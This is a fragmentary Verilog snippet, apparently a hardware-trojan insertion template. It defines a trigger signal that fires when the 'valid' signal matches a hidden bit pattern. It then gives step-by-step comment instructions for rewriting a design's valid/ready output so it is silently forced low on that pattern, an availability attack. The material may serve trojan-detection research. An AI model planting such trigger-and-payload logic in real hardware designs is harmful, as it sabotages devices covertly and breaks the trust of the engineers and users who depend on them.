 ...
 *
 * Trigger: Pattern match on valid (frequent data range)
 * Payload: Block valid for matching patterns
 *
...
wire trojan_active;
assign trojan_active = ((valid & TRIGGER_MASK) == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Availability Attack: Suppress valid for matching input patterns.
//
...
//   Find the output assign for valid (ready/valid/grant signal):
//     assign valid = <ready_expr>;
//   Replace with:
//     assign valid = trojan_active ? 1'b0 : (<ready_expr>);
//
